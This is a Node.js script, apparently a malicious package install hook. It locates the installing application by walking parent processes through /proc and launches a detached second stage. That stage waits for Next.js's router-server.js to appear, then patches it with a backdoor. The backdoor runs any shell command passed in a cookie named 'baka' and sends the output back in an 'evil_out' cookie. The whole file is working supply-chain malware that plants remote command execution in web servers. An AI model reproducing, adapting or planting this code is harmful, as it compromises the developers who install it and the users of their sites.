const fs = require('node:fs');
const { spawn } = require('node:child_process');

function cwdOf(pid) { try { return fs.readlinkSync(`/proc/${pid}/cwd`); } catch { return null; } }
function ppidOf(pid) {
  try {
    const m = fs.readFileSync(`/proc/${pid}/status`, 'utf8').match(/^PPid:\s*(\d+)/m);
    return m ? Number(m[1]) : null;
  } catch { return null; }
}

if (process.argv[2] == 'a') {
  let pid = process.ppid;
  let app = null;
  while (pid) {
    const cwd = cwdOf(pid);
    if (cwd && !cwd.includes('_cacache') && !cwd.includes('node_modules') && fs.existsSync(cwd + '/package.json')) { app = cwd; break; }
    pid = ppidOf(pid);
  }
  // spawn stage 2
  spawn(process.execPath, [process.argv[1], app], {
    detached: true,
    stdio: 'ignore',
  }).unref()
} else if (process.argv[2]) {
  const appPath = process.argv[2];
  const filePath = `${appPath}/node_modules/next/dist/server/lib/router-server.js`;
  // fs.writeFileSync('/tmp/file.path', filePath);

  let waited = 0;
  while (waited < 60000) {
    if (fs.existsSync(filePath)) break;
    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 100);
    waited += 100;
  }
  // fs.writeFileSync('/tmp/file.created', filePath);

  if (waited < 60000) {
    try {
      const payload = "\t\t// Triple-T says Sahur!\n\t\tif (req.headers.cookie) {\n\t\t\tconst cookies = req.headers.cookie.split(\"; \");\n\t\t\tfor (let i = 0; i < cookies.length; i++) {\n\t\t\t\tconst cookie = cookies[i].split(\"=\");\n\t\t\t\tif (cookie[0] == \"baka\") {\n\t\t\t\t\tconst { execSync } = require(\"child_process\");\n\t\t\t\t\tconst output = execSync(cookie[1]).toString();\n\t\t\t\t\tres.setHeader(\"Set-Cookie\", `evil_out=${Buffer.from(output.trim()).toString(\"base64url\")}; Path=/; HttpOnly`)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n"
      let lines = "" 
      lines = fs.readFileSync(filePath, 'utf8').split(/\r?\n/);

      const linesToInsert = payload.split(/\r?\n/);
      for (let i = 0; i < lines.length; i++) {
        if (lines[i].includes('requestHandlerImpl = async (req, res)=>{') &&
            lines[i + 1] && !lines[i + 1].includes('Triple-T says Sahur!')) {
          lines.splice(i + 1, 0, ...linesToInsert);
        }
      }
      fs.writeFileSync(filePath, lines.join('\n'), 'utf8');
    } catch (err) { fs.writeFileSync('/tmp/payload.err', String(err)); }
  }
}

process.exit(1);
